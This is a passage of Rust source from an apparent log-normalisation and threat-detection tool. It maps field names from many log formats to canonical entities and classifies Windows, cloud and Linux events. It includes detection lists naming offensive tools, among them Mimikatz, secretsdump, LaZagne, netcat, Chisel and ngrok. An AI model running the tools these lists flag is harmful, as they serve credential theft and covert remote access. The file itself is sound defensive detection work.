//! Canonical entities. Each log family names the same person, address or
//! program differently; `@role` virtual columns resolve them on demand while
//! the original fields stay untouched.
use crate::model::Event;
use serde::Serialize;
use serde_json::Value;
use std::borrow::Cow;
use std::collections::HashMap;
use std::net::IpAddr;
use std::sync::OnceLock;

#[derive(Clone, Copy, PartialEq, Eq, Hash, Debug, PartialOrd, Ord)]
pub enum Role {
    User,
    SrcIp,
    DstIp,
    Host,
    Process,
    ParentProcess,
    CommandLine,
    Url,
    Domain,
    Hash,
    DstPort,
    UserAgent,
    File,
    Status,
    Action,
    Outcome,
    SrcScope,
    DstScope,
    Tool,
}

pub struct RoleInfo {
    pub role: Role,
    pub column: &'static str,
    pub label: &'static str,
    /// Entities identify an actor or object; attributes describe the event.
    pub entity: bool,
}

pub const ROLES: &[RoleInfo] = &[
    RoleInfo { role: Role::User, column: "@user", label: "Usuário", entity: true },
    RoleInfo { role: Role::SrcIp, column: "@src_ip", label: "IP de origem", entity: true },
    RoleInfo { role: Role::DstIp, column: "@dst_ip", label: "IP de destino", entity: true },
    RoleInfo { role: Role::Host, column: "@host", label: "Host", entity: true },
    RoleInfo { role: Role::Process, column: "@process", label: "Processo", entity: true },
    RoleInfo { role: Role::ParentProcess, column: "@parent_process", label: "Processo pai", entity: true },
    RoleInfo { role: Role::CommandLine, column: "@cmdline", label: "Linha de comando", entity: false },
    RoleInfo { role: Role::Url, column: "@url", label: "URL", entity: true },
    RoleInfo { role: Role::Domain, column: "@domain", label: "Domínio", entity: true },
    RoleInfo { role: Role::Hash, column: "@hash", label: "Hash", entity: true },
    RoleInfo { role: Role::DstPort, column: "@dst_port", label: "Porta de destino", entity: false },
    RoleInfo { role: Role::UserAgent, column: "@user_agent", label: "User agent", entity: false },
    RoleInfo { role: Role::File, column: "@file", label: "Arquivo", entity: true },
    RoleInfo { role: Role::Status, column: "@status", label: "Status", entity: false },
    RoleInfo { role: Role::Action, column: "@action", label: "Ação", entity: false },
    RoleInfo { role: Role::Outcome, column: "@outcome", label: "Resultado", entity: false },
    RoleInfo { role: Role::SrcScope, column: "@src_scope", label: "Rede de origem", entity: false },
    RoleInfo { role: Role::DstScope, column: "@dst_scope", label: "Rede de destino", entity: false },
    RoleInfo { role: Role::Tool, column: "@tool", label: "Ferramenta", entity: false },
];

pub fn info(role: Role) -> &'static RoleInfo {
    ROLES.iter().find(|r| r.role == role).expect("role registered")
}

pub fn role_of_column(column: &str) -> Option<Role> {
    ROLES.iter().find(|r| r.column == column).map(|r| r.role)
}

/// Names accepted in the query language in addition to `@role`.
pub fn role_alias(name: &str) -> Option<Role> {
    let lower = name.trim_start_matches('@').to_lowercase();
    Some(match lower.as_str() {
        "user" | "usuario" | "usuário" | "conta" | "account" => Role::User,
        "ip" | "src_ip" | "srcip" | "source_ip" | "origem_ip" | "ip_origem" | "client_ip" => Role::SrcIp,
        "dst_ip" | "dstip" | "dest_ip" | "destination_ip" | "destino" | "ip_destino" => Role::DstIp,
        "host" | "hostname" | "maquina" | "máquina" | "computer" => Role::Host,
        "process" | "processo" | "image" | "exe" => Role::Process,
        "parent" | "parent_process" | "processo_pai" | "pai" => Role::ParentProcess,
        "cmd" | "cmdline" | "command" | "comando" | "commandline" => Role::CommandLine,
        "url" | "uri" => Role::Url,
        "domain" | "dominio" | "domínio" => Role::Domain,
        "hash" | "sha256" | "md5" | "sha1" => Role::Hash,
        "port" | "porta" | "dst_port" | "dport" => Role::DstPort,
        "ua" | "user_agent" | "useragent" | "agente" => Role::UserAgent,
        "file" | "arquivo_alvo" => Role::File,
        "status" => Role::Status,
        "action" | "acao" | "ação" => Role::Action,
        "outcome" | "resultado" => Role::Outcome,
        "src_scope" | "rede_origem" => Role::SrcScope,
        "dst_scope" | "rede_destino" => Role::DstScope,
        "tool" | "ferramenta" => Role::Tool,
        _ => return None,
    })
}

// Lower number = preferred alias when several are present.
const ALIASES: &[(&str, Role, u8)] = &[
    ("user.name", Role::User, 0),
    ("targetusername", Role::User, 1),
    ("username", Role::User, 2),
    ("user_name", Role::User, 2),
    ("user", Role::User, 3),
    ("usr", Role::User, 4),
    ("account_name", Role::User, 4),
    ("accountname", Role::User, 4),
    ("account", Role::User, 5),
    ("login", Role::User, 5),
    ("userprincipalname", Role::User, 3),
    ("useridentity.username", Role::User, 2),
    ("useridentity.arn", Role::User, 6),
    ("actor.alternateid", Role::User, 2),
    ("cs-username", Role::User, 2),
    ("remote_user", Role::User, 3),
    ("suser", Role::User, 3),
    ("duser", Role::User, 4),
    ("subjectusername", Role::User, 7),
    ("usuario", Role::User, 3),
    ("usuário", Role::User, 3),
    ("acct", Role::User, 5),
    ("principal", Role::User, 6),
    ("email", Role::User, 8),
    ("source.ip", Role::SrcIp, 0),
    ("src_ip", Role::SrcIp, 1),
    ("srcip", Role::SrcIp, 1),
    ("src", Role::SrcIp, 2),
    ("client_ip", Role::SrcIp, 1),
    ("clientip", Role::SrcIp, 1),
    ("client.ip", Role::SrcIp, 1),
    ("client.ipaddress", Role::SrcIp, 1),
    ("c-ip", Role::SrcIp, 1),
    ("remote_addr", Role::SrcIp, 2),
    ("remoteaddr", Role::SrcIp, 2),
    ("ipaddress", Role::SrcIp, 2),
    ("sourceipaddress", Role::SrcIp, 1),
    ("sourceip", Role::SrcIp, 1),
    ("sourceaddress", Role::SrcIp, 2),
    ("source_address", Role::SrcIp, 2),
    ("src_addr", Role::SrcIp, 2),
    ("id.orig_h", Role::SrcIp, 1),
    ("calleripaddress", Role::SrcIp, 1),
    ("ip_cliente", Role::SrcIp, 2),
    ("rhost", Role::SrcIp, 3),
    ("addr", Role::SrcIp, 4),
    ("ip", Role::SrcIp, 5),
    ("destination.ip", Role::DstIp, 0),
    ("dst_ip", Role::DstIp, 1),
    ("dstip", Role::DstIp, 1),
    ("dest_ip", Role::DstIp, 1),
    ("destip", Role::DstIp, 1),
    ("dst", Role::DstIp, 2),
    ("destinationip", Role::DstIp, 1),
    ("destaddress", Role::DstIp, 2),
    ("destinationaddress", Role::DstIp, 2),
    ("dst_addr", Role::DstIp, 2),
    ("id.resp_h", Role::DstIp, 1),
    ("s-ip", Role::DstIp, 2),
    ("server_ip", Role::DstIp, 2),
    ("host.name", Role::Host, 0),
    ("hostname", Role::Host, 1),
    ("host", Role::Host, 2),
    ("computer", Role::Host, 1),
    ("computername", Role::Host, 1),
    ("workstationname", Role::Host, 4),
    ("device.hostname", Role::Host, 1),
    ("dvchost", Role::Host, 2),
    ("shost", Role::Host, 3),
    ("agent.hostname", Role::Host, 3),
    ("_hostname", Role::Host, 2),
    ("machine", Role::Host, 4),
    ("process.executable", Role::Process, 0),
    ("process.name", Role::Process, 1),
    ("image", Role::Process, 1),
    ("newprocessname", Role::Process, 1),
    ("processname", Role::Process, 2),
    ("process_name", Role::Process, 2),
    ("exe", Role::Process, 2),
    ("process", Role::Process, 3),
    ("comm", Role::Process, 4),
    ("program", Role::Process, 4),
    ("fname", Role::Process, 5),
    ("sproc", Role::Process, 4),
    ("process.parent.executable", Role::ParentProcess, 0),
    ("process.parent.name", Role::ParentProcess, 1),
    ("parentimage", Role::ParentProcess, 1),
    ("parentprocessname", Role::ParentProcess, 1),
    ("parent_process", Role::ParentProcess, 2),
    ("process.command_line", Role::CommandLine, 0),
    ("commandline", Role::CommandLine, 1),
    ("command_line", Role::CommandLine, 1),
    ("processcommandline", Role::CommandLine, 1),
    ("cmdline", Role::CommandLine, 2),
    ("scriptblocktext", Role::CommandLine, 2),
    ("cmd", Role::CommandLine, 3),
    ("command", Role::CommandLine, 4),
    ("url.full", Role::Url, 0),
    ("url.original", Role::Url, 0),
    ("url", Role::Url, 1),
    ("request_uri", Role::Url, 1),
    ("requesturi", Role::Url, 1),
    ("cs-uri-stem", Role::Url, 1),
    ("uri", Role::Url, 2),
    ("http.url", Role::Url, 1),
    ("url.path", Role::Url, 2),
    ("request", Role::Url, 3),
    ("path", Role::Url, 4),
    ("dns.question.name", Role::Domain, 0),
    ("queryname", Role::Domain, 1),
    ("query", Role::Domain, 3),
    ("qname", Role::Domain, 1),
    ("domain", Role::Domain, 2),
    ("server_name", Role::Domain, 3),
    ("tls.sni", Role::Domain, 2),
    ("sni", Role::Domain, 2),
    ("dhost", Role::Domain, 4),
    ("file.hash.sha256", Role::Hash, 0),
    ("sha256", Role::Hash, 1),
    ("hashes", Role::Hash, 1),
    ("hash", Role::Hash, 2),
    ("sha1", Role::Hash, 3),
    ("md5", Role::Hash, 4),
    ("fileHash", Role::Hash, 2),
    ("destination.port", Role::DstPort, 0),
    ("dst_port", Role::DstPort, 1),
    ("dstport", Role::DstPort, 1),
    ("dest_port", Role::DstPort, 1),
    ("destport", Role::DstPort, 1),
    ("dpt", Role::DstPort, 1),
    ("destinationport", Role::DstPort, 1),
    ("id.resp_p", Role::DstPort, 1),
    ("s-port", Role::DstPort, 2),
    ("user_agent.original", Role::UserAgent, 0),
    ("user_agent", Role::UserAgent, 1),
    ("useragent", Role::UserAgent, 1),
    ("http_user_agent", Role::UserAgent, 1),
    ("cs(user-agent)", Role::UserAgent, 1),
    ("cs-user-agent", Role::UserAgent, 1),
    ("http.user_agent", Role::UserAgent, 1),
    ("requestclientapplication", Role::UserAgent, 2),
    ("agent", Role::UserAgent, 3),
    ("ua", Role::UserAgent, 3),
    ("file.path", Role::File, 0),
    ("targetfilename", Role::File, 1),
    ("objectname", Role::File, 2),
    ("file.name", Role::File, 2),
    ("filename", Role::File, 2),
    ("filepath", Role::File, 2),
    ("http.response.status_code", Role::Status, 0),
    ("status_code", Role::Status, 1),
    ("statuscode", Role::Status, 1),
    ("sc-status", Role::Status, 1),
    ("response_code", Role::Status, 2),
    ("status", Role::Status, 3),
];

fn alias_table() -> &'static HashMap<String, (Role, u8)> {
    static TABLE: OnceLock<HashMap<String, (Role, u8)>> = OnceLock::new();
    TABLE.get_or_init(|| {
        ALIASES
            .iter()
            .map(|(key, role, priority)| (key.to_ascii_lowercase(), (*role, *priority)))
            .collect()
    })
}

fn scalar(value: &Value) -> Option<Cow<'_, str>> {
    match value {
        Value::String(s) => Some(Cow::Borrowed(s.as_str())),
        Value::Number(n) => Some(Cow::Owned(n.to_string())),
        Value::Bool(b) => Some(Cow::Owned(b.to_string())),
        _ => None,
    }
}

fn usable(value: &str) -> bool {
    let v = value.trim();
    !v.is_empty()
        && !matches!(
            v,
            "-" | "--" | "n/a" | "N/A" | "null" | "(null)" | "none" | "None" | "0.0.0.0" | "::" | "-:-"
        )
        && v.len() <= 4096
}

/// Lowercases a short ASCII key into a stack buffer to avoid allocating per lookup.
fn lookup_key<'a>(key: &str, buffer: &'a mut [u8; 96]) -> Option<&'a str> {
    let bytes = key.as_bytes();
    if bytes.len() > buffer.len() {
        return None;
    }
    for (slot, byte) in buffer.iter_mut().zip(bytes) {
        *slot = byte.to_ascii_lowercase();
    }
    std::str::from_utf8(&buffer[..bytes.len()]).ok()
}

pub fn parse_ip(value: &str) -> Option<IpAddr> {
    let v = value.trim().trim_matches(['[', ']', '"']);
    if let Ok(ip) = v.parse::<IpAddr>() {
        return Some(ip);
    }
    // "1.2.3.4:5678" and "::ffff:1.2.3.4"
    if let Some((host, port)) = v.rsplit_once(':') {
        if port.chars().all(|c| c.is_ascii_digit()) && host.contains('.') {
            if let Ok(ip) = host.trim_matches(['[', ']']).parse::<IpAddr>() {
                return Some(ip);
            }
        }
    }
    v.strip_prefix("::ffff:").and_then(|rest| rest.parse::<IpAddr>().ok())
}

pub fn ip_scope(ip: IpAddr) -> &'static str {
    match ip {
        IpAddr::V4(v4) => {
            let o = v4.octets();
            if v4.is_loopback() {
                "loopback"
            } else if v4.is_private() || (o[0] == 100 && (64..128).contains(&o[1])) {
                "privado"
            } else if v4.is_link_local() {
                "link-local"
            } else if v4.is_multicast() || v4.is_broadcast() {
                "multicast"
            } else if v4.is_unspecified() || v4.is_documentation() || o[0] >= 240 {
                "reservado"
            } else {
                "público"
            }
        }
        IpAddr::V6(v6) => {
            let s = v6.segments();
            if v6.is_loopback() {
                "loopback"
            } else if (s[0] & 0xfe00) == 0xfc00 {
                "privado"
            } else if (s[0] & 0xffc0) == 0xfe80 {
                "link-local"
            } else if v6.is_multicast() {
                "multicast"
            } else if v6.is_unspecified() {
                "reservado"
            } else if let Some(v4) = v6.to_ipv4_mapped() {
                ip_scope(IpAddr::V4(v4))
            } else {
                "público"
            }
        }
    }
}

// ------------------------------------------------------------- tools

pub struct ToolMatch {
    pub name: &'static str,
    /// "scanner" (reconnaissance through HTTP) or "offensive" (post-exploitation).
    pub kind: &'static str,
}

const UA_TOOLS: &[(&str, &str)] = &[
    ("sqlmap", "sqlmap"),
    ("nikto", "Nikto"),
    ("nmap", "Nmap"),
    ("masscan", "masscan"),
    ("zgrab", "ZGrab"),
    ("gobuster", "Gobuster"),
    ("dirbuster", "DirBuster"),
    ("dirb/", "dirb"),
    ("wfuzz", "Wfuzz"),
    ("fuzz faster u fool", "ffuf"),
    ("ffuf", "ffuf"),
    ("hydra", "Hydra"),
    ("nuclei", "Nuclei"),
    ("acunetix", "Acunetix"),
    ("nessus", "Nessus"),
    ("openvas", "OpenVAS"),
    ("wpscan", "WPScan"),
    ("jorgee", "Jorgee"),
    ("havij", "Havij"),
    ("commix", "Commix"),
    ("burp", "Burp Suite"),
    ("owasp zap", "OWASP ZAP"),
    ("zaproxy", "OWASP ZAP"),
    ("metasploit", "Metasploit"),
    ("censysinspect", "Censys"),
    ("l9explore", "LeakIX"),
    ("feroxbuster", "feroxbuster"),
    ("arachni", "Arachni"),
    ("w3af", "w3af"),
    ("xsstrike", "XSStrike"),
];

const PROCESS_TOOLS: &[(&str, &str)] = &[
    ("mimikatz", "Mimikatz"),
    ("sekurlsa::", "Mimikatz"),
    ("psexec", "PsExec"),
    ("paexec", "PAExec"),
    ("rubeus", "Rubeus"),
    ("sharphound", "SharpHound"),
    ("bloodhound", "BloodHound"),
    ("lazagne", "LaZagne"),
    ("procdump", "ProcDump"),
    ("impacket", "Impacket"),
    ("wmiexec", "Impacket"),
    ("secretsdump", "Impacket"),
    ("crackmapexec", "CrackMapExec"),
    ("netexec", "NetExec"),
    ("cobaltstrike", "Cobalt Strike"),
    ("certify.exe", "Certify"),
    ("seatbelt", "Seatbelt"),
    ("winpeas", "winPEAS"),
    ("linpeas", "linPEAS"),
    ("pspy", "pspy"),
    ("chisel", "Chisel"),
    ("ngrok", "ngrok"),
    ("nc.exe", "Netcat"),
    ("ncat", "Ncat"),
    ("plink", "Plink"),
    ("adfind", "AdFind"),
    ("nltest /domain_trusts", "nltest"),
    ("xmrig", "XMRig"),
];

pub fn tool_in_user_agent(ua: &str) -> Option<ToolMatch> {
    let lower = ua.to_ascii_lowercase();
    UA_TOOLS
        .iter()
        .find(|(needle, _)| lower.contains(needle))
        .map(|(_, name)| ToolMatch { name, kind: "scanner" })
}

pub fn tool_in_process(text: &str) -> Option<ToolMatch> {
    let lower = text.to_ascii_lowercase();
    PROCESS_TOOLS
        .iter()
        .find(|(needle, _)| lower.contains(needle))
        .map(|(_, name)| ToolMatch { name, kind: "offensive" })
}

// ------------------------------------------------------------- messages

struct MessageRules {
    user: Vec<regex::Regex>,
    src_ip: regex::Regex,
    dst_ip: regex::Regex,
    dst_port: regex::Regex,
    command: regex::Regex,
}

fn message_rules() -> &'static MessageRules {
    static RULES: OnceLock<MessageRules> = OnceLock::new();
    RULES.get_or_init(|| MessageRules {
        user: [
            r"(?:Failed|Accepted) \S+ for (?:invalid user )?([^\s]+) from",
            r"Invalid user ([^\s]+) from",
            r"authentication failure;.*\buser=([^\s]+)",
            r"session (?:opened|closed) for user ([^\s(]+)",
            r"^\s*([A-Za-z0-9._$\\-]+) : (?:\d+ incorrect password attempts ; )?TTY=",
            r"FAILED SU \(to [^)]+\) ([^\s]+) on",
            r"new user: name=([^,\s]+)",
            r"(?i)(?:login|logon|authentication)(?: attempt)? (?:failed|failure|succeeded|successful)? ?for (?:user )?'?([A-Za-z0-9._@\\$-]{1,64})'?",
            r#"(?i)\b(?:user|usuario|usuário|username|login)[=:]\s*['"]?([A-Za-z0-9._@\\$-]{1,64})"#,
        ]
        .iter()
        .map(|p| regex::Regex::new(p).expect("user rule"))
        .collect(),
        src_ip: regex::Regex::new(
            r"(?i)(?:\bfrom\s+|\brhost=|\bSRC=|\bclient[ :=]\s*|\bsrc[=:]\s*|\borigem[=:]\s*|\bremote[_ ]addr(?:ess)?[=:]\s*|\bsource(?: ip)?[=:]\s*)\[?((?:\d{1,3}\.){3}\d{1,3}|[0-9a-f]{0,4}(?::[0-9a-f]{0,4}){2,7})",
        )
        .expect("src ip rule"),
        dst_ip: regex::Regex::new(r"(?i)(?:\bDST=|\bdst[=:]\s*|\bdestination(?: ip)?[=:]\s*)((?:\d{1,3}\.){3}\d{1,3})")
            .expect("dst ip rule"),
        dst_port: regex::Regex::new(r"(?i)(?:\bDPT=|\bdpt[=:]\s*|\bdport[=:]\s*)(\d{1,5})").expect("port rule"),
        command: regex::Regex::new(r"(?:\bCOMMAND=|\bCMD \()(.+?)\)?$").expect("command rule"),
    })
}

fn from_message(ev: &Event, role: Role) -> Option<String> {
    let msg = ev.message.as_str();
    if msg.is_empty() || msg.len() > 16_384 {
        return None;
    }
    let rules = message_rules();
    match role {
        Role::User => {
            // A cheap guard keeps the regexes off ordinary messages.
            let lower_hint = ["for ", "user", "User", "TTY=", "name=", "login", "Login", "usu"];
            if !lower_hint.iter().any(|hint| msg.contains(hint)) {
                return None;
            }
            rules.user.iter().find_map(|re| {
                re.captures(msg)
                    .and_then(|c| c.get(1))
                    .map(|m| m.as_str().trim_matches(['\'', '"', ',', ';']).to_string())
                    .filter(|v| usable(v) && v.len() <= 64)
            })
        }
        Role::SrcIp => rules
            .src_ip
            .captures(msg)
            .and_then(|c| c.get(1))
            .filter(|m| parse_ip(m.as_str()).is_some())
            .map(|m| m.as_str().to_string()),
        Role::DstIp => rules
            .dst_ip
            .captures(msg)
            .and_then(|c| c.get(1))
            .filter(|m| parse_ip(m.as_str()).is_some())
            .map(|m| m.as_str().to_string()),
        Role::DstPort => rules
            .dst_port
            .captures(msg)
            .and_then(|c| c.get(1))
            .map(|m| m.as_str().to_string()),
        Role::CommandLine => {
            if !msg.contains("COMMAND=") && !msg.contains("CMD (") {
                return None;
            }
            rules
                .command
                .captures(msg)
                .and_then(|c| c.get(1))
                .map(|m| m.as_str().trim().to_string())
        }
        _ => None,
    }
}

// ------------------------------------------------------------- lookup

fn field_value(ev: &Event, role: Role) -> Option<Cow<'_, str>> {
    let table = alias_table();
    let mut best: Option<(u8, Cow<'_, str>)> = None;
    let mut buffer = [0u8; 96];
    for (key, value) in &ev.fields {
        let Some(lower) = lookup_key(key, &mut buffer) else { continue };
        let Some(&(candidate, priority)) = table.get(lower) else { continue };
        if candidate != role || best.as_ref().is_some_and(|(p, _)| *p <= priority) {
            continue;
        }
        if let Some(text) = scalar(value).filter(|t| usable(t)) {
            best = Some((priority, text));
        }
    }
    best.map(|(_, value)| value)
}

fn is_syslog_like(ev: &Event) -> bool {
    ev.fields.contains_key("process") || ev.fields.contains_key("msgid")
}

fn normalize_hash(value: Cow<'_, str>) -> Cow<'_, str> {
    // Sysmon: "SHA1=..,MD5=..,SHA256=..,IMPHASH=.."
    if !value.contains('=') {
        return value;
    }
    let parts: Vec<(&str, &str)> = value
        .split(',')
        .filter_map(|part| part.split_once('='))
        .collect();
    for wanted in ["SHA256", "SHA1", "MD5"] {
        if let Some((_, hash)) = parts.iter().find(|(k, _)| k.trim().eq_ignore_ascii_case(wanted)) {
            return Cow::Owned(hash.trim().to_string());
        }
    }
    value
}

/// Canonical value of one role, or `None` when the event does not carry it.
pub fn value(ev: &Event, role: Role) -> Option<Cow<'_, str>> {
    match role {
        Role::Action => return action_outcome(ev).0.map(Cow::Borrowed),
        Role::Outcome => return action_outcome(ev).1.map(Cow::Borrowed),
        Role::SrcScope => {
            return value(ev, Role::SrcIp)
                .and_then(|ip| parse_ip(&ip))
                .map(|ip| Cow::Borrowed(ip_scope(ip)))
        }
        Role::DstScope => {
            return value(ev, Role::DstIp)
                .and_then(|ip| parse_ip(&ip))
                .map(|ip| Cow::Borrowed(ip_scope(ip)))
        }
        Role::Tool => return tool(ev).map(|t| Cow::Borrowed(t.name)),
        _ => {}
    }
    if let Some(found) = field_value(ev, role) {
        return Some(match role {
            Role::Hash => normalize_hash(found),
            Role::SrcIp | Role::DstIp => match parse_ip(&found) {
                Some(ip) => Cow::Owned(ip.to_string()),
                None => return fallback(ev, role),
            },
            _ => found,
        });
    }
    fallback(ev, role)
}

fn fallback(ev: &Event, role: Role) -> Option<Cow<'_, str>> {
    match role {
        // Web access logs store the client address as the origin.
        Role::SrcIp if parse_ip(&ev.source).is_some() => {
            return Some(Cow::Borrowed(ev.source.as_str()))
        }
        Role::Host if is_syslog_like(ev) && usable(&ev.source) && parse_ip(&ev.source).is_none() => {
            return Some(Cow::Borrowed(ev.source.as_str()))
        }
        Role::Status if is_http_status(&ev.code) && has_http_shape(ev) => {
            return Some(Cow::Borrowed(ev.code.as_str()))
        }
        _ => {}
    }
    from_message(ev, role).map(Cow::Owned)
}

fn is_http_status(code: &str) -> bool {
    code.len() == 3 && code.parse::<u16>().is_ok_and(|n| (100..600).contains(&n))
}

fn has_http_shape(ev: &Event) -> bool {
    ["method", "cs-method", "http.request.method", "request_method", "verb"]
        .iter()
        .any(|k| ev.fields.contains_key(*k))
}

/// Value of a `@role` virtual column.
pub fn column_value<'a>(ev: &'a Event, column: &str) -> Option<Cow<'a, str>> {
    role_of_column(column).and_then(|role| value(ev, role))
}

pub fn tool(ev: &Event) -> Option<ToolMatch> {
    if let Some(ua) = field_value(ev, Role::UserAgent) {
        if let Some(found) = tool_in_user_agent(&ua) {
            return Some(found);
        }
    }
    for role in [Role::Process, Role::CommandLine] {
        if let Some(text) = field_value(ev, role) {
            if let Some(found) = tool_in_process(&text) {
                return Some(found);
            }
        }
    }
    None
}

// ------------------------------------------------------------- knowledge

fn field_ci<'a>(ev: &'a Event, key: &str) -> Option<Cow<'a, str>> {
    ev.fields
        .iter()
        .find(|(k, _)| k.eq_ignore_ascii_case(key))
        .and_then(|(_, v)| scalar(v))
}

fn provider_hint(ev: &Event) -> String {
    let mut hint = ev.source.to_ascii_lowercase();
    for key in ["channel", "winlog.channel", "winlog.provider_name", "provider", "log_name", "event.provider"] {
        if let Some(v) = field_ci(ev, key) {
            hint.push(' ');
            hint.push_str(&v.to_ascii_lowercase());
        }
    }
    hint
}

fn windows_security(ev: &Event, hint: &str) -> bool {
    hint.contains("security-auditing")
        || hint.contains("microsoft-windows-security")
        || hint.split_whitespace().any(|w| w == "security")
        || ["TargetUserName", "SubjectUserSid", "LogonType", "TargetUserSid"]
            .iter()
            .any(|k| ev.fields.contains_key(*k))
}

fn status_ok(value: Option<Cow<'_, str>>) -> Option<&'static str> {
    let v = value?;
    let v = v.trim().to_ascii_lowercase();
    if v == "0x0" || v == "0" || v == "0x00000000" {
        Some("success")
    } else if v.starts_with("0x") {
        Some("failure")
    } else {
        None
    }
}

fn textual_outcome(v: &str) -> Option<&'static str> {
    let v = v.trim().to_ascii_lowercase();
    match v.as_str() {
        "success" | "succeeded" | "successful" | "ok" | "allow" | "allowed" | "accept" | "accepted"
        | "pass" | "permitted" | "sucesso" | "permitido" | "true" => Some("success"),
        "failure" | "failed" | "fail" | "denied" | "deny" | "drop" | "dropped" | "reject"
        | "rejected" | "block" | "blocked" | "error" | "falha" | "negado" | "bloqueado" | "false" => {
            Some("failure")
        }
        _ => None,
    }
}

fn message_has(ev: &Event, needles: &[&str]) -> bool {
    let msg = ev.message.as_str();
    needles.iter().any(|n| msg.contains(n))
}

/// Normalized action and outcome from well-known event families.
pub fn action_outcome(ev: &Event) -> (Option<&'static str>, Option<&'static str>) {
    // ECS-shaped sources already carry both.
    let explicit_action = field_ci(ev, "event.action");
    let explicit_outcome = field_ci(ev, "event.outcome").and_then(|v| textual_outcome(&v));
    let hint = provider_hint(ev);
    let code = ev.code.trim();

    if !code.is_empty() {
        if hint.contains("sysmon") {
            let action = match code {
                "1" => Some("process_start"),
                "3" => Some("network_connection"),
                "5" => Some("process_end"),
                "7" => Some("image_load"),
                "8" => Some("remote_thread"),
                "10" => Some("process_access"),
                "11" => Some("file_create"),
                "12" | "13" | "14" => Some("registry_change"),
                "15" => Some("file_stream"),
                "22" => Some("dns_query"),
                "23" | "26" => Some("file_delete"),
                "25" => Some("process_tampering"),
                _ => None,
            };
            if action.is_some() {
                return (action, Some("success"));
            }
        }
        if windows_security(ev, &hint) {
            let status = || status_ok(field_ci(ev, "Status")).or(status_ok(field_ci(ev, "FailureCode")));
            let found: Option<(&str, Option<&str>)> = match code {
                "4624" => Some(("logon", Some("success"))),
                "4625" => Some(("logon", Some("failure"))),
                "4634" | "4647" => Some(("logoff", Some("success"))),
                "4648" => Some(("logon_explicit", Some("success"))),
                "4672" => Some(("privileged_logon", Some("success"))),
                "4688" => Some(("process_start", Some("success"))),
                "4689" => Some(("process_end", Some("success"))),
                "4697" => Some(("service_install", Some("success"))),
                "4698" => Some(("task_create", Some("success"))),
                "4699" => Some(("task_delete", Some("success"))),
                "4702" => Some(("task_update", Some("success"))),
                "4719" => Some(("audit_policy_change", Some("success"))),
                "4720" => Some(("account_create", Some("success"))),
                "4722" => Some(("account_enable", Some("success"))),
                "4723" | "4724" => Some(("password_change", Some("success"))),
                "4725" => Some(("account_disable", Some("success"))),
                "4726" => Some(("account_delete", Some("success"))),
                "4728" | "4732" | "4756" => Some(("group_member_add", Some("success"))),
                "4729" | "4733" | "4757" => Some(("group_member_remove", Some("success"))),
                "4738" => Some(("account_change", Some("success"))),
                "4740" => Some(("account_lockout", Some("failure"))),
                "4768" => Some(("kerberos_tgt", status())),
                "4769" => Some(("kerberos_service_ticket", status())),
                "4771" => Some(("logon", Some("failure"))),
                "4776" => Some(("logon", status())),
                "4657" => Some(("registry_change", Some("success"))),
                "4663" => Some(("object_access", Some("success"))),
                "5140" | "5145" => Some(("share_access", Some("success"))),
                "5156" => Some(("network_connection", Some("success"))),
                "5157" => Some(("network_connection", Some("failure"))),
                "1102" => Some(("log_clear", Some("success"))),
                "4616" => Some(("time_change", Some("success"))),
                _ => None,
            };
            if let Some((action, outcome)) = found {
                return (Some(action), outcome);
            }
        }
        if (hint.contains("service control manager") || hint.contains("system")) && code == "7045" {
            return (Some("service_install"), Some("success"));
        }
        if hint.contains("eventlog") && code == "104" {
            return (Some("log_clear"), Some("success"));
        }
        if hint.contains("powershell") && (code == "4104" || code == "4103") {
            return (Some("script_execution"), Some("success"));
        }
        if hint.contains("taskscheduler") && code == "106" {
            return (Some("task_create"), Some("success"));
        }
        if hint.contains("windows defender") && ["1116", "1117", "1006", "1007"].contains(&code) {
            return (Some("malware_detected"), Some("success"));
        }
        if hint.contains("windows defender") && code == "5001" {
            return (Some("protection_disabled"), Some("success"));
        }
    }

    // Cloud audit logs.
    if let Some(name) = field_ci(ev, "eventName") {
        let error = field_ci(ev, "errorCode").is_some();
        let outcome = if name == "ConsoleLogin" {
            field_ci(ev, "responseElements.ConsoleLogin")
                .and_then(|v| textual_outcome(&v))
                .or(Some(if error { "failure" } else { "success" }))
        } else if error {
            Some("failure")
        } else {
            Some("success")
        };
        let action = match name.as_ref() {
            "ConsoleLogin" | "AssumeRoleWithSAML" | "AssumeRoleWithWebIdentity" => Some("logon"),
            "CreateUser" | "CreateLoginProfile" => Some("account_create"),
            "DeleteUser" => Some("account_delete"),
            "AddUserToGroup" | "AttachUserPolicy" | "AttachRolePolicy" | "PutUserPolicy"
            | "PutRolePolicy" | "AttachGroupPolicy" => Some("privilege_grant"),
            "CreateAccessKey" | "CreateLoginProfileKey" | "UpdateLoginProfile" => {
                Some("credential_create")
            }
            "StopLogging" | "DeleteTrail" | "UpdateTrail" | "DeleteFlowLogs"
            | "DeleteDetector" | "DisableSecurityHub" => Some("log_clear"),
            "AuthorizeSecurityGroupIngress" | "ModifyInstanceAttribute" => Some("network_change"),
            "GetSecretValue" | "GetParameter" | "GetParameters" => Some("secret_access"),
            _ => None,
        };
        if action.is_some() {
            return (action, outcome);
        }
    }
    if let Some(event_type) = field_ci(ev, "eventType") {
        // Okta System Log
        let outcome = field_ci(ev, "outcome.result").and_then(|v| textual_outcome(&v));
        let action = match event_type.as_ref() {
            "user.session.start" | "user.authentication.sso" | "user.authentication.auth_via_mfa" => {
                Some("logon")
            }
            "user.lifecycle.create" => Some("account_create"),
            "group.user_membership.add" => Some("group_member_add"),
            "user.account.lock" => Some("account_lockout"),
            _ => None,
        };
        if action.is_some() {
            return (action, outcome);
        }
    }
    if let Some(result) = field_ci(ev, "resultType").or_else(|| field_ci(ev, "status.errorCode")) {
        // Azure AD sign-ins: 0 = success.
        if field_ci(ev, "operationName").is_some_and(|op| op.to_ascii_lowercase().contains("sign-in"))
            || ev.fields.contains_key("appDisplayName")
        {
            let ok = result.trim() == "0";
            return (Some("logon"), Some(if ok { "success" } else { "failure" }));
        }
    }

    // Linux authentication and administration.
    let msg = ev.message.as_str();
    if !msg.is_empty() && msg.len() < 16_384 {
        if message_has(ev, &["Failed password", "Failed publickey", "Invalid user ", "authentication failure", "FAILED SU", "incorrect password attempt", "Connection closed by authenticating user", "maximum authentication attempts exceeded", "Failed none for"]) {
            return (Some("logon"), Some("failure"));
        }
        if message_has(ev, &["Accepted password", "Accepted publickey", "Accepted keyboard-interactive", "Successful su for"]) {
            return (Some("logon"), Some("success"));
        }
        if msg.contains("COMMAND=") {
            return (Some("privilege_use"), Some("success"));
        }
        if message_has(ev, &["new user: name=", "useradd"]) && msg.contains("name=") {
            return (Some("account_create"), Some("success"));
        }
